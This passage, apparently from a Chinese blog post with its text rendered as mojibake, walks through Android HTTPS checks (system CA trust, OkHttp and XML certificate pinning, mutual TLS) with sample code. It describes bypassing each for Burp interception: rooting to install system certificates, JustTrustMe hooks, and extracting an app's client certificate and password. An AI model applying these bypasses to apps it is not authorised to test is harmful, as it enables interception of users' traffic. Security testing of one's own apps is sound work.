¡éªŒ</h2><p>åœ¨Android7.0ä¹‹å‰ï¼Œé»˜è®¤ç”¨æˆ·çº§çš„è¯ä¹¦å‡­æ®æ˜¯è¢«æœåŠ¡ç«¯æ‰€ä¿¡ä»»çš„ï¼Œä½†<strong>7.0ä¹‹åï¼Œå®‰å“ç³»ç»Ÿä¸å†ä¿¡ä»»ç”¨æˆ·çº§å‡­æ®</strong>ã€‚</p><p>OkHttpæ¡†æ¶å‘èµ·httpsè¯·æ±‚æ—¶ï¼Œé»˜è®¤å°±æ˜¯ä½¿ç”¨çš„ç³»ç»Ÿä¿¡ä»»åº“è¯ä¹¦é“¾å¯¹æœåŠ¡ç«¯è¿”å›çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œhttpsè¯·æ±‚å®ç°å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* httpsåè®®</span></span><br><span class="line"><span class="comment">* é»˜è®¤è¯ä¹¦é“¾æ ¡éªŒï¼Œåªä¿¡ä»»ç³»ç»ŸCA(æ ¹è¯ä¹¦)</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* OKHTTPé»˜è®¤çš„httpsè¯·æ±‚ä½¿ç”¨ç³»ç»ŸCAéªŒè¯æœåŠ¡ç«¯è¯ä¹¦ï¼ˆAndroid7.0ä»¥ä¸‹è¿˜ä¿¡ä»»ç”¨æˆ·è¯ä¹¦ï¼ŒAndroid7.0å¼€å§‹é»˜è®¤åªä¿¡ä»»ç³»ç»Ÿè¯ä¹¦ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mHttpsConnectButton = findViewById(R.id.httpsConnect);</span><br><span class="line">mHttpsConnectButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.baidu.com/?q=defaultCerts&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432002</span>;</span><br><span class="line">                    message.obj = <span class="string">&quot;è¯·æ±‚æˆåŠŸ: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434002</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è®¾ç½®ç³»ç»Ÿä»£ç†ï¼ŒæŠ“å–è¯¥æ•°æ®æŠ¥æ–‡ï¼Œä¼šå‘ç°AppæŠ¥é”™**<em>java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.*<strong>ï¼ŒæŠ“åŒ…å·¥å…·burpä¼šæç¤º</strong></em>certificate_unknown***ï¼Œå…¶åŸå› åœ¨äºburpæ‹¦æˆªhttpsæµé‡æ—¶ï¼Œä¼šåŒæ—¶å……å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ã€‚åœ¨é¢å‘Appæ—¶ï¼Œæ­¤æ—¶burpå……å½“æœåŠ¡ç«¯ï¼Œhttpsåè®®æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œburpä¼šå°†è‡ªå·±çš„è¯ä¹¦å‘é€ç»™Appï¼Œå› ä¸ºAppä½¿ç”¨ç³»ç»Ÿä¿¡ä»»åº“é‡Œé¢çš„è¯ä¹¦è¿›è¡Œæ ¡éªŒï¼Œè€Œburpçš„è¯ä¹¦ä¸åœ¨ç³»ç»Ÿä¿¡ä»»åº“ä¸­ï¼Œæ‰€ä»¥å¯¼è‡´httpsæ¡æ‰‹å¤±è´¥ï¼ŒæŠ¥é”™CertPathValidatorExceptionã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201334179.png" alt="image.png"> </p><p>æ ¹æ®ä¸Šè¿°åˆ†æï¼Œå¯¹æŠ—ä½¿ç”¨ç³»ç»Ÿè¯ä¹¦æ ¡éªŒçš„æ–¹å¼ï¼Œåªéœ€è¦å°†æŠ“åŒ…å·¥å…·çš„è¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿä¿¡ä»»åº“é‡Œé¢å³å¯æ­£å¸¸æŠ“åŒ…ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨Android 7.0ä»¥å‰ï¼Œåº”ç”¨é»˜è®¤ä¼šä¿¡ä»»ç³»ç»Ÿè¯ä¹¦å’Œç”¨æˆ·è¯ä¹¦ï¼ŒAndroid 7.0å¼€å§‹ï¼Œé»˜è®¤åªä¿¡ä»»ç³»ç»Ÿè¯ä¹¦ï¼Œåœ¨rootç¯å¢ƒä¸‹ï¼Œå°†è¯ä¹¦å¯¼å…¥ç³»ç»Ÿç›®å½•çš„æ–¹æ³•å¯å‚è€ƒ  <a href="https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/">Configuring Burp Suite With Android Nougat</a>   ï¼Œå°†æŠ“åŒ…å·¥å…·çš„è¯ä¹¦æ·»åŠ åˆ°æ‰‹æœºç³»ç»Ÿè¯ä¹¦ä»¥åï¼Œè®¾ç½®ä»£ç†ï¼ŒæŠ“åŒ…æ•ˆæœå¦‚ä¸‹:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201334847.png" alt="image.png"> </p><h2 id="3-SSLPinning"><a href="#3-SSLPinning" class="headerlink" title="3. SSLPinning"></a>3. SSLPinning</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232205858.jpeg" alt="img"> </p><p><a href="https://developer.android.com/training/articles/security-config">SSL PINNING</a>æ˜¯Googleå®˜æ–¹æ¨èçš„æ ¡éªŒæ–¹å¼ï¼ŒåŸç†æ˜¯åœ¨å®¢æˆ·ç«¯ä¸­é¢„å…ˆè®¾ç½®å¥½è¯ä¹¦ä¿¡æ¯ï¼Œæ¡æ‰‹æ—¶ä¸æœåŠ¡ç«¯è¿”å›çš„è¯ä¹¦è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ç¡®ä¿æœåŠ¡ç«¯è¿”å›çš„è¯ä¹¦çš„çœŸå®æ€§ï¼Œå®ç°æ–¹å¼æœ‰ä¸¤ç§ï¼Œ</p><ul><li>ä¸€ç§æ˜¯åœ¨ä»£ç å±‚å®ç°</li><li>ä¸€ç§æ˜¯é€šè¿‡network_security_config.xmlé…ç½®æ–‡ä»¶å®Œæˆã€‚</li></ul><h3 id="ä»£ç æ ¡éªŒ"><a href="#ä»£ç æ ¡éªŒ" class="headerlink" title="ä»£ç æ ¡éªŒ"></a>ä»£ç æ ¡éªŒ</h3><p>ä»¥OkHttpç½‘ç»œæ¡†æ¶ä¸ºä¾‹ï¼Œæ ¡éªŒè¯ä¹¦å…¬é’¥çš„ç¤ºåˆ—ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SSL Pinning</span></span><br><span class="line"><span class="comment">* å…¬é’¥ç»‘å®šï¼ŒéªŒè¯è¯ä¹¦å…¬é’¥ï¼Œè¿˜å¯ä»¥addéªŒè¯å…¶ä»–è¦ç´ </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mSSLPinningButton = findViewById(R.id.sslPinning);</span><br><span class="line">mSSLPinningButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_DOMAIN</span> <span class="operator">=</span> <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">                <span class="comment">//è·å–ç›®æ ‡å…¬é’¥: openssl s_client -connect www.baidu.com:443 -servername www.baidu.com | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_PUBLIC_KEY</span> <span class="operator">=</span> <span class="string">&quot;sha256//558pd1Y5Vercv1ZoSqOrJWDsh9sTMEolM6T8csLucQ=&quot;</span>;</span><br><span class="line">                <span class="comment">//åªæ ¡éªŒå…¬é’¥</span></span><br><span class="line">                <span class="type">CertificatePinner</span> <span class="variable">pinner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">                        .add(CA_DOMAIN, CA_PUBLIC_KEY)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">OkHttpClient</span> <span class="variable">pClient</span> <span class="operator">=</span> client.newBuilder().certificatePinner(pinner).build();</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.baidu.com/?q=SSLPinningCode&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> pClient.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432003</span>;</span><br><span class="line">                    message.obj = <span class="string">&quot;è¯·æ±‚æˆåŠŸ: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434003</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>é€šè¿‡res&#x2F;xml&#x2F;network_security_config.xmlé…ç½®æ–‡ä»¶å¯¹è¯ä¹¦è¿›è¡Œæ ¡éªŒæ˜¯å®˜æ–¹æ¨èä½¿ç”¨çš„æ–¹æ³•ï¼Œé…ç½®æ–¹å¼å¯ä»¥ç»†åˆ†ä¸ºä¸¤ç§:</p><p>ä½¿ç”¨<strong>è¯ä¹¦æ ¡éªŒ</strong>å’Œ<strong>å…¬é’¥æ ¡éªŒ</strong>ï¼Œå…·ä½“ç¤ºåˆ—å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--è¯ä¹¦æ ¡éªŒ--&gt;</span><br><span class="line">&lt;domain-config&gt;</span><br><span class="line">    &lt;domain includeSubdomains=<span class="string">&quot;true&quot;</span>&gt;bing.com&lt;/domain&gt;</span><br><span class="line">    &lt;trust-anchors&gt;</span><br><span class="line">        &lt;!--è·å–è¯ä¹¦: openssl s_client -connect bing.com:<span class="number">443</span> -servername bing.com | openssl x509 -out bing.pem--&gt;</span><br><span class="line">        &lt;certificates src=<span class="string">&quot;@raw/bing&quot;</span>/&gt;</span><br><span class="line">    &lt;/trust-anchors&gt;</span><br><span class="line"></span><br><span class="line">&lt;/domain-config&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--å…¬é’¥æ ¡éªŒ--&gt;</span><br><span class="line">&lt;domain-config&gt;</span><br><span class="line">    &lt;domain includeSubdomains=<span class="string">&quot;true&quot;</span>&gt;so.com&lt;/domain&gt;</span><br><span class="line">    &lt;!--so.comå…¬é’¥æ ¡éªŒ</span><br><span class="line">    è·å–å…¬é’¥: openssl s_client -connect so.com:<span class="number">443</span> -servername so.com | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;pin-set expiration=<span class="string">&quot;2099-01-01&quot;</span>&gt;</span><br><span class="line">        &lt;pin digest=<span class="string">&quot;SHA-256&quot;</span>&gt;XCXZ8ud+eneT+di9eIMfC7Z2x+p2cr2KJ3e7TnIEOx4=&lt;/pin&gt;</span><br><span class="line">    &lt;/pin-set&gt;</span><br><span class="line">&lt;/domain-config&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡SSL PINNINGç»‘å®šè¯ä¹¦ä»¥åï¼Œè®¾ç½®ç³»ç»Ÿä»£ç†ï¼Œå³ä½¿å°†æŠ“åŒ…å·¥å…·çš„è¯ä¹¦å¯¼å…¥åˆ°ç³»ç»Ÿç›®å½•ï¼ŒæŠ“åŒ…æ—¶ä¾ç„¶ä¼šå‘ç°AppæŠ¥é”™javax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure! æˆ–è€… javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.ï¼ŒæŠ¥é”™çš„åŸå› æ˜¯<strong>APPé¢„ç½®çš„è¯ä¹¦ä¿¡æ¯ä¸æœåŠ¡ç«¯è¿”å›çš„è¯ä¹¦ä¿¡æ¯æ ¡éªŒä¸ä¸€è‡´ï¼Œå¯¼è‡´æ¡æ‰‹å¤±è´¥</strong></p><p>ç»•è¿‡SSL PINNINGä¼šç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œéœ€è¦ä½¿ç”¨åˆ°ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œæ¯”å¦‚è€ç‰Œçš„JustTrustMeæ¨¡å—ï¼Œå…¶ç»•è¿‡åŸç†æ˜¯é€šè¿‡Hookå„ç½‘ç»œæ¡†æ¶çš„è¯ä¹¦éªŒè¯æ–¹æ³•ï¼Œæ›¿æ¢å…¶æ–¹æ³•åŸæœ‰çš„é€»è¾‘ï¼Œä½¿æ ¡éªŒå¤±æ•ˆã€‚å®‰è£…æ’ä»¶ä»¥åï¼Œè®¾ç½®ä»£ç†ï¼ŒæŠ“åŒ…æ•ˆæœå¦‚ä¸‹:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232208743.png" alt="image.png"> </p><h2 id="4-åŒå‘è¯ä¹¦æ ¡éªŒ"><a href="#4-åŒå‘è¯ä¹¦æ ¡éªŒ" class="headerlink" title="4. åŒå‘è¯ä¹¦æ ¡éªŒ"></a>4. åŒå‘è¯ä¹¦æ ¡éªŒ</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232209718.jpeg" alt="img"> </p><p>æ— è®ºæ˜¯ç³»ç»Ÿè¯ä¹¦é“¾æ ¡éªŒè¿˜æ˜¯SSL PINNINGï¼Œå…¶æœ¬è´¨éƒ½æ˜¯å®¢æˆ·ç«¯åœ¨æ ¡éªŒæœåŠ¡ç«¯çš„è¯ä¹¦ï¼Œå³å•å‘æ ¡éªŒã€‚å¦‚æœå…ˆä¿å­˜ä¸€ä¸ªè¯ä¹¦åœ¨APPå®¢æˆ·ç«¯ä¸­ï¼ŒHTTPSåè®®æ¡æ‰‹æ—¶å®¢æˆ·ç«¯æŠŠAPPä¸­ä¿å­˜çš„è¯ä¹¦å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿™ç§å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼ŒåŒæ—¶æœåŠ¡ç«¯ä¹Ÿæ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦çš„æ–¹å¼ç§°ä¸ºåŒå‘æ ¡éªŒã€‚ä»¥OkHttpæ¡†æ¶ä¸ºä¾‹ï¼Œç¤ºåˆ—ä»£ç å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* åŒå‘æ ¡éªŒ</span></span><br><span class="line"><span class="comment">* å› è¯¥æµ‹è¯•æ˜¯è‡ªå»ºæœåŠ¡å™¨å¹¶è‡ªç­¾åï¼Œæ‰€ä»¥éœ€è¦å…ˆåœ¨res/xml/network_security_configä¸­é…ç½®ä¿¡ä»»æœåŠ¡ç«¯è¯ä¹¦</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mTwoVerificationButton = findViewById(R.id.twoVerification);</span><br><span class="line">mTwoVerificationButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">X509TrustManager</span> <span class="variable">trustManager</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">TrustManagerFactory</span> <span class="variable">trustManagerFactory</span> <span class="operator">=</span> TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class="line"></span><br><span class="line">                    trustManagerFactory.init((KeyStore) <span class="literal">null</span>);</span><br><span class="line">                    TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();</span><br><span class="line">                    <span class="keyword">if</span> (trustManagers.length != <span class="number">1</span> || !(trustManagers[<span class="number">0</span>] <span class="keyword">instanceof</span> X509TrustManager)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected default trust managers:&quot;</span> + Arrays.toString(trustManagers));</span><br><span class="line">                    &#125;</span><br><span class="line">                    trustManager = (X509TrustManager) trustManagers[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">OkHttpClient</span> <span class="variable">mClient</span> <span class="operator">=</span> client.newBuilder().sslSocketFactory(ClientSSLSocketFactory.getSocketFactory(MainActivity.<span class="built_in">this</span>),trustManager).hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HostnameVerifier</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname, SSLSession session)</span> &#123;</span><br><span class="line">                        <span class="type">HostnameVerifier</span> <span class="variable">hv</span> <span class="operator">=</span> HttpsURLConnection.getDefaultHostnameVerifier();</span><br><span class="line">                        <span class="keyword">return</span> hv.verify(<span class="string">&quot;www.test.com&quot;</span>, session);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).build();</span><br><span class="line"></span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.test.com/?q=doubleVerif&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> mClient.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432005</span>;</span><br><span class="line">                    Log.d(<span class="string">&quot;TestReq&quot;</span>, response.body().string());</span><br><span class="line">                    message.obj = <span class="string">&quot;è¯·æ±‚æˆåŠŸ: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434005</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç¤ºåˆ—ä¸­æ ¡éªŒçš„æ˜¯test.comåŸŸåï¼Œå¯ä»¥é€šè¿‡ç»‘å®šhostsçš„æ–¹å¼åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ã€‚ClientSSLSocketFactoryå¯¹è±¡å®ç°å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientSSLSocketFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_STORE_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;Curz0n&quot;</span>;<span class="comment">//è¯ä¹¦å¯†ç </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InputStream client_input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory <span class="title function_">getSocketFactory</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//å®¢æˆ·ç«¯è¯ä¹¦</span></span><br><span class="line">            client_input = context.getResources().getAssets().open(<span class="string">&quot;client.p12&quot;</span>);</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            <span class="type">KeyStore</span> <span class="variable">keyStore</span> <span class="operator">=</span> KeyStore.getInstance(<span class="string">&quot;PKCS12&quot;</span>);</span><br><span class="line">            keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray());</span><br><span class="line">            <span class="type">KeyManagerFactory</span> <span class="variable">keyManagerFactory</span> <span class="operator">=</span> KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray());</span><br><span class="line">            sslContext.init(keyManagerFactory.getKeyManagers(), <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> sslContext.getSocketFactory();</span><br><span class="line">            <span class="keyword">return</span> factory;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                client_input.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯ä½¿ç”¨Pythonå®ç°çš„ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="comment">#æœåŠ¡ç«¯è¯ä¹¦å’Œç§é’¥</span></span><br><span class="line">serverCerts = <span class="string">&quot;%s/certs/server/server-cert.cer&quot;</span> % os.getcwd()</span><br><span class="line">serverKey = <span class="string">&quot;%s/certs/server/server-key.key&quot;</span> % os.getcwd()</span><br><span class="line"><span class="comment">#å®¢æˆ·ç«¯è¯ä¹¦</span></span><br><span class="line">clientCerts = <span class="string">&quot;%s/certs/client/client-cert.cer&quot;</span> % os.getcwd()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_writeheaders</span>(<span class="params">self</span>):</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        self._writeheaders()</span><br><span class="line">        self.wfile.write(<span class="string">&quot;OK&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        port = <span class="number">443</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    server_address = (<span class="string">&quot;0.0.0.0&quot;</span>, <span class="built_in">int</span>(port))</span><br><span class="line">    server = HTTPServer(server_address, RequestHandler)</span><br><span class="line">    <span class="comment">#åŒå‘æ ¡éªŒ</span></span><br><span class="line">    server.socket = ssl.wrap_socket(server.socket, certfile = serverCerts, server_side = <span class="literal">True</span>,  </span><br><span class="line">                               keyfile = serverKey,</span><br><span class="line">                               cert_reqs = ssl.CERT_REQUIRED,</span><br><span class="line">                               ca_certs = clientCerts</span><br><span class="line">                               )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting server, listen at: %s:%s&quot;</span> % server_address)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è®¾ç½®ç³»ç»Ÿä»£ç†ï¼Œè®¿é—®ç›®æ ‡æŠ“å–æŠ¥æ–‡ï¼Œå‘ç°ä»£ç†å·¥å…·burpæŠ¥é”™certificate_required</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232211076.png" alt="image.png"> </p><p>æˆ‘ä»¬çŸ¥é“burpèƒ½æŠ“åŒ…HTTPSåè®®æŠ¥æ–‡çš„åŸç†æ˜¯: burpåœ¨ä¸­é—´å³å……å½“å®¢æˆ·ç«¯ï¼Œåˆå……å½“æœåŠ¡ç«¯ã€‚åœ¨burpå†’å……å®¢æˆ·ç«¯æ—¶ï¼Œå› ä¸ºæœåŠ¡ç«¯è¦æ±‚APPå‘é€å®¢æˆ·ç«¯è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œè€Œburpæ²¡æœ‰å®¢æˆ·ç«¯è¯ä¹¦ï¼Œæ‰€ä»¥å¯¼è‡´æ¡æ‰‹å¤±è´¥ã€‚çŸ¥é“æŠ¥é”™çš„åŸå› ï¼Œé‚£è§£å†³é—®é¢˜å°±ç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é€†å‘APPè·å–åˆ°å®¢æˆ·ç«¯è¯ä¹¦å’Œå¯†ç ï¼Œç„¶åå°†å®¢æˆ·ç«¯è¯ä¹¦å¯¼å…¥burpä¸­ï¼Œè¿™æ 